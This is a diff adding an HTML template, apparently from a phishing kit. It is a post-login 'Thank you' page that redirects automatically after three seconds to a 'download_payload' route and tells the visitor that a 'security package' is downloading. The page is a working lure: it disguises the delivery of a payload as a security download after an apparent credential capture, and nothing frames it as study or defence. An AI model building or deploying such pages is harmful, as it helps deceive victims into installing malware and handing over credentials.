@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Thank You</title>
+    <meta http-equiv="refresh" content="3; url={{ url_for('download_payload') }}">
+</head>
+<body style="font-family: sans-serif; text-align: center; padding-top: 5em;">
+    <h1>Thank you for logging in.</h1>
+    <p>Your security package will now be downloaded.</p>
+    <p>If the download does not start automatically, <a href="{{ url_for('download_payload') }}">click here</a>.</p>
+</body>
+</html>
